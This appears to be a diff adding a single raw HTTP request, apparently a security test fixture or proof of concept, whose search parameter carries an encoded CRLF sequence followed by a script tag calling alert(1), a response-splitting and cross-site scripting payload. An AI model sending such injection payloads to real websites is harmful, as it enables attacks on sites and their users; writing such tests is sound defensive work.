@@ -1,0 +1,4 @@
+GET /a?search=red%3D%0d%0a%0d%0a\u003Cscript\u003Ealert(1)\u003C/script\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
